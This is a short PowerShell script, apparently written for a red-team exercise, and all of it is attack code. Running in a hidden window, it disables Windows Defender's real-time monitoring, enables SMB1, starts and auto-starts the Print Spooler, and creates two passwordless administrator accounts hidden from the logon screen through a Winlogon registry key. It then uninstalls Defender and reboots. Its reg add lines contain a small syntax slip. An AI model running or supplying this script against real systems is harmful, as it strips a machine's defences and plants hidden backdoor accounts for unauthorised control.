Scripted already PowerShell.exe -windowstyle hidden {Set-MpPreference -DisableRealtimeMonitoring $True
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
Start-Service -Name Spooler
Set-Service -Name Spooler -StartupType Automatic


New-LocalUser -Name "R3D_1337" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "R3D_1337"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v R3D_1337/t REG_DWORD /d 0 /f

New-LocalUser -Name "Mike" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "Mike"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Mike/t REG_DWORD /d 0 /f

Uninstall-WindowsFeature -Name Windows-Defender

Restart-Computer
}
